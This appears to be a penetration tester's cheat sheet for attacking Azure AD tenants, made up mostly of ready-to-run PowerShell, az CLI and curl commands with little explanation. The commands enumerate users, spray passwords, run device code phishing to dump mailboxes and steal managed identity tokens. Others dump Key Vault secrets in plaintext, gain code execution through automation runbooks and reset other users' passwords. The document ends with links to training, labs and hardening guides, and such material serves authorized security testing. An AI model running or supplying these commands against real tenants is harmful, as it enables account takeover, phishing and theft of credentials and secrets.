# Azure AD Assessment
## Manual Recon
### Enumerate the tenant id
```http
https://login.microsoftonline.com/example.onmicrosoft.com/.well-known/open
id-configuration
```
## Recon
```powershell
# Get all the information 
Import-Module .\AADInternals\AADInternals.psd1
$DomainName = "example.onmicrosoft.com"
Invoke-AADIntReconAsOutsider -DomainName $DomainName

# Enumerate Subdomains
Import-Module .\MicroBurst.psm1

# Enumerate all subdomains for an organization specified using the '-Base' parameter
Invoke-EnumerateAzureSubDomains -Base example -Verbose

# Validate if account exists
Invoke-AADIntUserEnumerationAsOutsider -username paul@example.onmicrosoft.com

# Enumerate valid Usernames
cat C:\tools\usernames.txt | Invoke-AADIntUserEnumerationAsOutsider

# Spray Accounts
# Usernames.txt should contain accounts with the fqdn e.g., karim@example.onmicrosoft.com
Invoke-MSOLSpray -UserList .\usernames.txt -Password Winter2022
```

## Device Code phising
```powershell
Import-Module .\TokenTactics-main\TokenTactics.psd1   

# Generate the device code and user code
Get-AzureToken -Client MSGraph

# Dump Outlook using the access token
Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder
```

## Abusing Managed Identities
```powershell
# Extract the MSI_SECRET and MSI_ENDPOINT values from env. variables
env | grep MSI

# Query the Identitiy endpoint for GraphAPI, AzureVault and Management access tokens
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

$mgmtToken = 'eyJ0eXAiOiJKV1QiLX9rsVtX99Rk...[SNIP]...BQXTOxQ8GYK8QvIV7ZuwGjlyc9iL7Q'

$graph = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJ...[SNIP]...H8PmkZf3tTKd57dg'

$keyVault = 'eyJ0eXAiOiJdiUm9LSTNR...[SNIP]...S-KsIKUadEC784ShMsWcirZCw'

Disconnect-AzAccount

Connect-AzAccount -KeyVaultAccessToken $keyVault -AccessToken $mgmtToken -GraphAccessToken $graph -AccountId e1703509-9d01-4f6d-b883-82783ab59446
```

## Enumerate Resources
### Powershell AZ Module
```powershell
$password = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential('storageviewer@example.onmicrosoft.com', $Password) Connect-AzAccount -Credential $creds

Connect-AzAccount -Credential $creds

# Enumerate resources our user has access to
Get-AzResource

# Confirm account is service principal
Get-AzContext

Get-AzADuser
Get-AzADGroup
Get-AzADGroupMember -ObjectId 01086658-6706-44e8-a373-96ab550c72f7

# Enumerate a specific user
Get-AzADUser -UserPrincipalName HelpDeskAdmin@example.onmicrosoft.com

# Enum directory roles
Get-AzureADDirectoryRole

# Identify users with global admin
Get-AzureADDirectoryRole -ObjectId b5da7126-cb27-48e6-a316-e319ba453b65 | Get-AzureADDirectoryRoleMember

# Identify users with the helpdeskadmin role
Get-AzureADDirectoryRole -ObjectId 65b73b34-3665-424f-8c89-d17857e1cd9f | Get-AzureADDirectoryRoleMember


# Check our permission for the storage account
Get-AzRoleAssignment -scope /subscriptions/41f08921-2fda-417e-9c1f-898ffec3347a/resourceGroups/Storage-RG/providers/Microsoft.Storage/storageAccounts/examplestorage
```
### AZ Cli
```powershell
# --allow-no-subscriptions flag is needed for teanent that don't have any subscriptions
az login -u "james@example.onmicrosoft.com" -p "P@ssw0rd" --allow-no-subscriptions

# Login as a service principal account
az login --service-principal -u b17d33ed-2f12-4dd7-a902-a0a5d11eda1c -p P@ssw0rd --tenant d420c085-2058-4f82-9f80-1316b0034eee


# Check for the existence of  the C:\Users\username\.azure folder to validate if an account is logged
# Show logged in account
az account show

# Enumerate Users
az ad user list

# Find resources our user has access to
az resource list

# Check our roles
az role assignment list --all

# Generate access token for management and vault services
az account get-access-token --resource https://management.azure.com
az account get-access-token --resource https://vault.azure.net

# Describe custom roles 
az role definition list --custom-role-only
```

## Azure Hound
```powershell
.\azurehound-windows-amd64\azurehound.exe list -u "HelpDeskAdmin@example.onmicrosoft.com" -p 'P@ssw0rd' -t 'example.onmicrosoft.com' -o azure_hound.json
```
> As of now, azure blood hound is not very stable; Enable debug mode in Blood hound to view the raw queries, for better debugging.

## Enumerate SharePoint
```powershell
# Enumerate Root folder
$accessToken = 'eyJ0eXAiOiJKV1Qi...[SNIP]...1bpJg3QtPS8MO2'

$URi = 'https://graph.microsoft.com/v1.0/me/drive/root/children' 
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{ 'Authorization' = "Bearer $accessToken" } }
(Invoke-RestMethod @RequestParams).value

# Enumerate a the MyPat sub-folder
$URi = 'https://graph.microsoft.com/v1.0/me/drive/root:/MyPAT:/children'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{ 'Authorization' = "Bearer $accessToken" } }
(Invoke-RestMethod @RequestParams).value
```

## Dump Secerets Vault
```powershell
Get-AzKeyVault | fl *

Get-AzKeyVaultSecret -VaultName Paul-webapp-KeyVault

Get-AzKeyVaultSecret -VaultName Paul-webapp-KeyVault  -Name paul-localkeys -AsPlainText | fl *
```

## Gaining RCE from RunBooks
```powershell
Import-AzAutomationRunbook -Name Wowieee -Path C:\tools\shell.ps1 -AutomationAccountName terminal-srv-runbook -ResourceGroupName Runbook-RG -Type PowerShell -Force -Verbose

Publish-AzAutomationRunbook -RunbookName Wowieee -AutomationAccountName terminal-srv-runbook -ResourceGroupName Runbook-RG -Verbose 

Start-AzAutomationRunbook -RunbookName Wowieee -RunOn OnpremInternalDC -AutomationAccountName terminal-srv-runbook -ResourceGroupName Runbook-RG -Verbose
```

## Use Powershell AZ to reset a user password
```powershell
$password = "MyStr0ngPassw0rd1" | ConvertTo-SecureString -AsPlainText -Force

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq
"DevOpsApprover@example.onmicrosoft.com"}).ObjectId |
Set-AzureADUserPassword -Password $Password -Verbose
```

## Abusing illicit consent grant
### Validate the issue exists
[Cloud Misconfiguration & Risks - Azure](https://misconfig.io/cloud-misconfiguration-risks-azure/)
### Exploitation
[Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack (alteredsecurity.com)](https://www.alteredsecurity.com/post/Introduction-To-365-Stealer)
[GitHub - AlteredSecurity/365-Stealer: 365-Stealer is a phishing simualtion tool written in python3. It can be used to execute Illicit Consent Grant Attack.](https://github.com/AlteredSecurity/365-Stealer)


## Dump MSOL Password
[Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync · GitHub](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c)

## Dump Storage account Data
> Files wont show using az cli tool or powershell az module because it has because that the role assigned to storageviewer user is “Reader and Data Access

[Azure Storage Explorer – cloud storage management | Microsoft Azure](https://azure.microsoft.com/en-us/products/storage/storage-explorer/)

## Fundamentals
[Pentester Academy - Attacking and Defending Azure AD Cloud: Beginner's Edition](https://bootcamps.pentesteracademy.com/course/ad-azure-jul-22)
## Cheatsheets
[PayloadsAllTheThings/Cloud - Azure Pentest.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)

## Blog Posts
[Managed Identity Attack Paths, Part 1: Automation Accounts | by Andy Robbins | Posts By SpecterOps Team Members](https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a)
[Managed Identity Attack Paths, Part 2: Logic Apps | by Andy Robbins | Posts By SpecterOps Team Members](https://posts.specterops.io/managed-identity-attack-paths-part-2-logic-apps-52b29354fc54)
[Managed Identity Attack Paths, Part 3: Function Apps | by Andy Robbins | Posts By SpecterOps Team Members](https://posts.specterops.io/managed-identity-attack-paths-part-3-function-apps-300065251cbe)
[Introducing a new phishing technique for compromising Office 365 accounts | Device Code Phising - AADInternals](https://aadinternals.com/post/phishing/#:~:text=The%20basic%20idea%20to%20utilise%20device%20code%20authentication%20for%20phishing%20is%20following.&text=After%20receiving%20verification_uri%20and%20user_code,and%20completes%20the%20sign%20in.)
[Cloud Misconfiguration & Risks - Azure](https://misconfig.io/cloud-misconfiguration-risks-azure/)
[Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack (alteredsecurity.com)](https://www.alteredsecurity.com/post/Introduction-To-365-Stealer)
[Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials (aadinternals.com)](https://aadinternals.com/post/pta/)

## Labs
[CloudBreach.io - Breaching Azure](https://cloudbreach.io/labs/)

## Videos
[Azure Security best practices | Azure Tips and Tricks - YouTube](https://www.youtube.com/watch?v=mntOLLNejUo)
[Assume Breach: An Inside Look at Cloud Service Provider Security - YouTube](https://www.youtube.com/watch?v=lwjPGtGGe84&t=1500s) from 25:00 -> 27:00

## Hardening
[What is Conditional Access in Azure Active Directory? - Microsoft Entra | Microsoft Learn](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview)
[Just-in-time virtual machine access in Microsoft Defender for Cloud | Microsoft Learn](https://learn.microsoft.com/en-us/azure/defender-for-cloud/just-in-time-access-usage)